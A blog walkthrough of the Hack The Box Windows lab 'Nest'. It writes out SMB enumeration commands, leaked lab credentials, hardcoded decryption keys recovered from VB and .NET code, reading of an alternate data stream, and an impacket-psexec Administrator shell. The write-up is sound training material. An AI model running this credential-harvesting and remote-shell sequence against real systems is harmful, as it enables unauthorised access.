---
layout: post
title:  "Nest Writeup - Hack The Box"
date:   2025-08-22
desc: ""
keywords: "HTB,eCPPTv3,eJPT,OSCP,Windows,CIFS,Information Leakage,Reversing,Cryptography,Alternate Data Streams,dotPeek,Easy"
categories: [HTB]
tags: [HTB,eCPPTv3,eJPT,OSCP,Windows,CIFS,Information Leakage,Reversing,Cryptography,Alternate Data Streams,dotPeek,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/nest_writeup/Nest.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I resume my training on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform to continue growing professionally, and I choose a beautiful box with my favorite **Operating System** to confront - **Windows** - since I do not know much of its features and it is very difficult for me to advance in the different phases of the **Engagement**. The **Nest** box is rated with an **Easy** complexity, but I had a hard time completing it, so again I would like to emphasize that the punctuation of each lab is **very subjective**. In it I was able to improve my analysis and reversing skills, besides **configuring** a **virtual machine** among other things, these tasks are the great rewards that I always take from **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs. I just have to spawn the machine and start the writeup.

<br /><br />
<img src="{{ site.img_path }}/nest_writeup/Nest_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I verify that I already have connectivity with the machine by sending a trace with `ping` and then with `whichSystem.py` (**[hack4u community](https://hack4u.io/){:target="_blank"}** tool) I already have a high degree of certainty that the Operating System of the machine is **Windows** (thanks to the **TTL** value). Now I start the most important phase in every lab I do, the **Reconnaissance**, and for this I use `nmap` to first enumerate the open ports on the machine. With custom `nmap` scripts I can also leak information on the services exposed on each open port in addition to the versions. My next step is to use `crackmapexec` to get more information from the machine using the **SMB** protocol, but for some reason I'm unable to connect. With `smbclient` and `smbmap` I do manage to find some shared resources (**read-only**), which are worth investigating further.

> **[SQL Server Reporting Services (SSRS)](https://learn.microsoft.com/en-us/sql/reporting-services/create-deploy-and-manage-mobile-and-paginated-reports?view=sql-server-ver17){:target="_blank"}** provides a set of on-premises tools and services to create, deploy, and manage paginated reports. **SSRS** makes it easy to deliver the right information to the right users. You can view reports in a web browser on your computer, mobile device, or receive them via email.

```bash
ping -c 2 10.10.10.178
whichSystem.py 10.10.10.178
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.178 -oG allPorts
nmap -sCV -p445,4386 10.10.10.178 -oN targeted
# Reporting Service V1.2

crackmapexec smb 10.10.10.178

smbclient -L 10.10.10.178 -N
smbmap -H 10.10.10.178 -u 'null' --no-banner
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `smbclient` I succeed to connect through the **SMB** protocol and access the **Data** share, where there are many directories, in which I find some text files with very suggestive names, so I download them on my machine. In one of them I find credentials of a **temporary** account, which may help me to find more hidden system information.

```bash
smbclient //10.10.10.178/Data -N
  dir
  ...
  cd \Shared\Maintenance
  get "Maintenance Alerts.txt"
  cd \Shared\Templates\HR
  get "Welcome Email.txt"
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another service that I had not enumerated, is the one that is available on port **4386** and with `nc` I try to perform a **Banner Grabbing** and I get the service name and version. With `telnet` I access the service to investigate a little more in depth the actions I can perform, what it tells me in the help message is that I can perform queries to the database using the **HQK** format. I do a bit of guessing with the available commands and manage to access the file system of the victim machine, but I do not have the permissions to view the contents of the user account directories.

```bash
nc 10.10.10.178 4386

telnet 10.10.10.178 4386
  HELP
# This service allows users to run queries against databases using the legacy HQK format
  LIST
  HELP RUNQUERY
  RUNQUERY 1
# ?
  HELP SETDIR
  HELP LIST
  SETDIR \
  LIST
# :)
  SETDIR TempUser
  SETDIR Administrator
# Error: Access to the path ... is denied.
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I remember that I have credentials for a temporary account and there is a directory on the file system linked to it, so I was able to validate it with `crackmapexec` and then connect to the **HQK Reporting Service** to further enumerate the system. There is a very interesting **DEBUG** command to investigate, but the password that I have is not the right one to enable this functionality. With `smbclient` I can access the **TempUser** account directory, where I find and immediately download a text document that has **no content**. But even if I'm authenticated I do not have permission to upload files to the machine remotely.

```bash
cat Welcome\ Email.txt
crackmapexec smb 10.10.10.178 -u TempUser -p welcome2019
telnet 10.10.10.178 4386
  HELP
  DEBUG welcome2019

smbclient //10.10.10.178/Users -U HTB-NEST/TempUser%welcome2019
  dir
  cd Administrator
  dir

  cd ..\TempUser
  dir
  prompt off
  mget "New Text Document.txt"

ls
cat New\ Text\ Document.txt

echo 'oldboy was here' > test.txt
smbclient //10.10.10.178/Users -U HTB-NEST/TempUser%welcome2019
  cd TempUser
  put test.txt
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There are other shares that I can access using `smbclient`, but they have a lot of information, so I'm going to set up a **CIFS** mount to make browsing much faster, as if I were browsing my local file system. After mounting the **Data** resource and starting the enumeration, I find some **XML** files, in whose content I only find some paths that I think I should investigate, mainly the one related to the **Secure** resource. In the other resource (**Users**) I only have access to the empty file that I had previously found.

```bash
smbmap -H 10.10.10.178 -u 'TempUser' -p 'w...9' --no-banner
pushd /mnt
mkdir SMBNest
mount -t cifs //10.10.10.178/Data /mnt/SMBNest -o username=TempUser,password=w...9,domain=WORKGROUP,rw
cd SMBNest
tree -fas
cd /mnt/SMBNest/IT/Configs/Adobe
cat settings.xml
cd /mnt/SMBNest/IT/Configs/NotepadPlusPlus
cat config.xml
# <File filename="C:\windows\System32\drivers\etc\hosts" />
# <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
# <File filename="C:\Users\C.Smith\Desktop\todo.txt" />

mount -t cifs //10.10.10.178/Users /mnt/SMBNest -o username=TempUser,password=w...9,domain=WORKGROUP,rw
cd SMBNest
tree -fas

umount /mnt/SMBNest
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

When mounting the **Secure** resource I find some directories that I can't access but after trying harder to search for information I find very interesting project files, such as **RU Scanner**, which has an **.xml** configuration file related to the **LDAP** protocol in whose content I find a password that seems to be encoded. If I try to decode the content with **Base64**, the result is not readable, which makes me suspect that it is not only encoded but encrypted with some special algorithm. I continue my enumeration and my search pays off when I find the directory of a project, which by its name (**RUScanner**) seems to be related to the file I found previously. By its content it is a tool developed in **Visual Basic**.

```bash
mount -t cifs //10.10.10.178/Secure$ /mnt/SMBNest -o username=TempUser,password=welcome2019,domain=WORKGROUP,rw
tree -fas
cd /mnt/SMBNest/Finance
ls
# Permission denied :(

# Remember: <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
cd /mnt/SMBNest/IT/Carl
tree -fas
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to analyze the code in those **.vb** files that make up the **RU Scanner** project, to try to understand at a very high level of abstraction some of its functionalities. In the configuration script there are some global variable declarations that would correspond to a **username** and a **password**, in another one I find that a variable is declared linking it to the content of the **.xml** file that I had previously found (**RU_Config.xml**). Analyzing the code of this last script, I can conjecture that it is in charge of extracting the **username** and the encrypted **password**, but it also uses the **DecryptString function** (probably declared in the **Utils** file) to decrypt the latter. In another script I find the declaration of the variables that store the **username** and **password**, but they also have the property of being public. Finally in the **Utils.vb** script I find the function in charge of decrypting the password, in which I have all the source code that I can try to reuse to access the clear text of the password.

> A **.vb** file is a source code file created in **Visual Basic** language that was created by **Microsoft** for development of **.NET** applications.

> **[Visual Basic](https://learn.microsoft.com/en-us/dotnet/visual-basic/){:target="_blank"}** is an object-oriented programming language developed by **Microsoft**. Using **Visual Basic** makes it fast and easy to create type-safe **.NET** apps.

> The **System.Text namespace** in **Visual Basic .NET** provides classes for working with **character encodings**, **string** manipulation, and **regular expressions**.

> The **System.Text.Encoding class** is commonly used for **converting strings** to and from byte arrays using different character encodings (e.g., **ASCII**, **UTF-8**, **Unicode**).

> The **[System.Security.Cryptography](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography?view=net-9.0){:target="_blank"}** provides **cryptographic services**, including secure encoding and **decoding** of data, as well as many other operations, such as **hashing**, **random number generation**, and **message authentication**.

> **System.Security.Cryptography Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256) functionality**, based on the arguments, it is highly probable that:

- **EncryptedString**: This is the data to be decrypted.
- **"N3st22"**: This likely represents the password or passphrase used to derive the encryption key.
- **"88552299"**: This could be the salt value used in conjunction with the password for key derivation, or potentially an initialization vector (IV) if the previous argument was the key.
- **2**: This argument might specify the cryptographic algorithm (e.g., **AES**, **TripleDES**), the padding mode, or the key size if the last argument is not explicitly defining it.
- **"464R5DFA5DL6LE28"**: This is likely the initialization vector (**IV**), crucial for block cipher modes like **CBC** to ensure different ciphertexts for identical plaintexts.
- **256**: This most likely specifies the key size in bits, commonly **256** for **AES-256**.

```bash
cat ./Docs/ip.txt
cat ./Docs/mmc.txt

cat "./VB Projects/WIP/RU/RUScanner/ConfigFile.vb"
cat "./VB Projects/WIP/RU/RUScanner/Module1.vb"
# Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
# Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}

cat "./VB Projects/WIP/RU/RUScanner/SsoIntegration.vb"
cat "./VB Projects/WIP/RU/RUScanner/Utils.vb"
# Imports System.Text
# Imports System.Security.Cryptography
# Public Shared Function DecryptString(EncryptedString As String) As String
# Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to resort to the online **[.NET Fiddle](https://dotnetfiddle.net/){:target="_blank"}** tool to compile the source code I found, so that I can decrypt the **password**. I just have to clean up the code and keep only the one related to decrypting the encrypted string, the next thing is to try to run the program to solve the problems that may arise. In my first attempt there is a problem related to the **[non-declaration of the Convert function](https://stackoverflow.com/questions/23931908/vb-net-sub-main-was-not-found){:target="_blank"}**, which is solved just by importing the **System** module, the next problem that arises is the lack of declaration of the **main** procedure, so I must use **Sub** to declare the **Main** subroutine. Finally I choose an old version of the compiler (**.NET 5**) and I get the program to run without problems.

> In **Visual Basic**, the **Dim** keyword is an abbreviation for **"Dimension"**. It is used to **declare variables** and allocate storage space for them in memory.

```bash
cat "./VB Projects/WIP/RU/RUScanner/Utils.vb" | xclip -sel clip
# Public Shared Function DecryptString
# Public Shared Function Decrypt
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The next step is to use the subroutine of the **Module1.vb** script, which is responsible for invoking the **DecryptString** function when declaring the variables that store in clear text the **username** and **password**. An error is generated in the execution because I also need from the subroutine declared in the script **SsoIntegration.vb**, I will also harcodear in the program code the **username** and the encrypted **password** because they are the values needed by the decryption function. The last step is to fix a problem with a library (**libssl**) that seems not to be present for the compiler version I chose, so just by using an older version (**.NET 4.7.2**) I get the code to run and get the **password** in **clear text**.

```bash
cat Module1.vb

cat SsoIntegration.vb

# Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}
# System.Console.WriteLine(plainText)
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check with `crackmapexec` that the credentials are valid, but I try again to enable the **DEBUG** functionality in the **HQK Reporting Service** but it is not the password that is needed. With `smbmap` I list the shared resources, but now I focus on **Users** because I have new credentials and in the personal directory of the user **C.Smith** I manage to access the first flag of the laboratory and I also observe that there is a directory related to the **HQK Reporting Service** that I'm going to investigate thoroughly.

```bash
crackmapexec smb 10.10.10.178 -u c.smith -p xR...Rx
telnet 10.10.10.178 4386
  DEBUG xR...Rx
  QUIT

smbmap -H 10.10.10.178 -u 'c.smith' -p 'xR...Rx' --no-banner
smbmap -H 10.10.10.178 -u 'c.smith' -p 'xR...Rx' --no-banner -r 'Users'
smbmap -H 10.10.10.178 -u 'c.smith' -p 'xR...Rx' --no-banner -r 'Users/c.smith'
smbmap -H 10.10.10.178 -u 'c.smith' -p 'xR...Rx' --no-banner --download 'Users/c.smith/user.txt'
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to setup a **CIFS** type mount again, but with the passwords I just found and access the **Users** share to investigate the **HQK Reporting** directory. In it I find a text file that might be related to the **DEBUG** mode I'm trying to enable on the port **4386** service, but suspiciously it is empty. On previous **Windows OS** machines there is a feature of the **NTFS** file system - **Alternative data streams** - that allows to hide private content in a file, but from my attacking machine I don't know very well how to check if this feature is being used. With a search engine I find the way to **[read ADS over SMB using smbclient](https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux){:target="_blank"}**, and with the allinfo command I can see all the streams that the file owns, one of them seems to store the password I'm looking for. Once I manage to download the file with the indicated stream I can read the password, which now allows me to enable **DEBUG** mode and access new commands.

> **Alternate Data Streams** (**ADS**) in **Windows** is a feature of the **NTFS file system** that allows a file to have **multiple data streams**, not just the primary one visible in file managers like **Explorer**. These additional streams can be used to store **metadata**, **comments**, or other information related to the file, and they can be **hidden** from standard file browsing. While **ADS** has legitimate uses, it has also been exploited by malware to hide malicious code.

```bash
mount -t cifs //10.10.10.178/Users /mnt/SMBNest -o username=c.smith,password=xRxRxPANCAK3SxRxRx,domain=WORKGROUP,rw
cd SMBNest/
tree -fas
# ./C.Smith/HQK Reporting/Debug Mode Password.txt
cat ./C.Smith/HQK\ Reporting/Debug\ Mode\ Password.txt

cat ./C.Smith/HQK\ Reporting/HQK_Config_Backup.xml

smbclient //10.10.10.178/Users -U HTB-NEST/c.smith%xRxRxPANCAK3SxRxRx
  help
  ? allinfo
  allinfo "Debug Mode Password.txt"
# stream: [:Password:$DATA], 15 bytes
  get "Debug Mode Password.txt:Password:$DATA"

cat Debug\ Mode\ Password.txt:Password:\$DATA

telnet 10.10.10.178 4386
  DEBUG W...w
  HELP
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I investigate the new commands to which I have access now and I can leak information from the **HQK Reporting Server** service, but the most interesting thing is that if I access the previous directory of the current one I find some other very interesting ones, such as **LDAP** or even **Logs**. I enumerate the first one and I find an executable file and its configuration file, I take advantage that I have setup the mount to access them and download them on my attacking machine. The executable is compatible for **Windows** and has a **32bit** architecture.

```bash
telnet 10.10.10.178 4386
  HELP SERVICE
  SERVICE
  HELP SESSION
  SESSION
  HELP SHOWQUERY
  SHOWQUERY 1
  SHOWQUERY 2
  SHOWQUERY 3
  HELP
  SETDIR ..
# Current directory set to HQK
  LIST
# LDAP
  SETDIR LDAP
  LIST
# HqkLdap.exe, Ldap.conf
  SHOWQUERY 2
# User=Administrator
# Password=yyE....

mount -t cifs //10.10.10.178/Users /mnt/SMBNest -o username=c.smith,password=xRxRxPANCAK3SxRxRx,domain=WORKGROUP,rw
cd /mnt/SMBNest/C.Smith/HQK\ Reporting/AD\ Integration\ Module
cp ./HqkLdap.exe /home/al3j0/Documents/HackTheBox/Windows/Nest/content
umount /mnt/SMBNest

file HqkLdap.exe
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the **LDAP** configuration file I find the **Administrator** user credentials, but again they seem to be encrypted and this time I don't have the source code of the project being used but I do have the **executable** that I can analyze in a virtual machine with **Windows OS**. I'm going to use the **dotPeek** tool to decompile the program so I must first install it in the Virtual Machine and then configure an **SMB** server with `impacket-smbserver` to be able to transfer the binary, but for some problem with the **Firewall** or some security policy I can not get it, not even configuring the **SMB** server with authentication.

> **[dotPeek](https://www.jetbrains.com/decompiler/){:target="_blank"}** is a free-of-charge standalone tool based on **ReSharper's** bundled decompiler. It can reliably decompile any **.NET** assembly into equivalent **C#** or **IL** code.

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Virtual Machine - Windows 10**:

```cmd
# \\192.168.1.15\smbFolder
net use x: \\192.168.1.15\smbFolder
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username oldboy -password oldboy123%!
```

> **Virtual Machine - Windows 10**:

```cmd
net use x: \\192.168.1.15\smbFolder
dir x:\
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way I find to transfer the binary is to configure a local server with `python` and this time I can download it in the virtual machine using the browser. I confirm that the integrity of the file has not been compromised in the transfer, comparing the hash of the file, everything seems correct. Now with **dotPeek** I decompile the binary and investigate the source code, after a while trying to leak relevant information to finish engaging the machine I find the class in charge of **decrypting a string**. My instinct tells me that it can be used to decrypt the password of the **Administrator** user, so I'm going to transfer all the source code of this class to my attacker machine to compile a new program with **[.NET Fiddle](https://dotnetfiddle.net/){:target="_blank"}**.

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Virtual Machine - Windows 10**:

```html
# http://192.168.1.15/

# JetBrains dotPeek
# File --> Open
# HqkLdap --> HqkLdap --> CR
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username oldboy -password oldboy123%!
```

> **Virtual Machine - Windows 10**:

```cmd
net use x: \\192.168.1.15\smbFolder /u:oldboy oldboy123%!
copy .\HqkLdap.txt x:\
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I copy the source code into the **[.NET Fiddle](https://dotnetfiddle.net/){:target="_blank"}** prompt, I remove all unnecessary code, but unfortunately I encounter an error when I try to run the program for the first time. I do some research on the internet to solve the problem of the **[missing declaration of the main public class](https://stackoverflow.com/questions/32689811/public-main-method-is-required-in-a-public-class){:target="_blank"}** and I get the program to run without any problems. The next thing I do is to analyze the source code to find the class in charge of decrypting a string (**RD**) and also to know how to invoke it correctly to obtain in clear text the value that I pass as argument. With all the information that I need I use the **WriteLine** function in the **Main** class, to obtain by console the value of the encrypted password of the **Administrator** user. Now I can verify with `crackmapexec` that the password is valid and with `impacket-psexec` I can connect to the machine with the **Administrator** user account to access the last flag. **Lab finally engaged**.

> **Attacker Machine**:

```bash
# https://dotnetfiddle.net/
# #nullable disable         [Delete]
# namespace HqkLdap;        [Delete]
# Fatal Error: Public Main() method is required in a public class
# public static void Main(string[] args)

# CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256 /*0x0100*/);
# private static string RD

crackmapexec smb 10.10.10.178 -u Administrator -p X...X
impacket-psexec WORKGROUP/Administrator:X..X@10.10.10.178 cmd.exe

whoami
```

<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nest_writeup/Nest_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What a great way to continue my practice with **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs, this machine took me a lot to complete and it's considered **easy**! so I don't want to imagine when I have to confront an **Insane one**. I learned and reinforced a lot of concepts, plus I got a great feeling of satisfaction once I finished it. I'm going to continue with another box and take advantage of this energy renewal I just got, but first I have to kill the **Nest** box and choose my next challenge.

<br /><br />
<img src="{{ site.img_path }}/nest_writeup/Nest_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
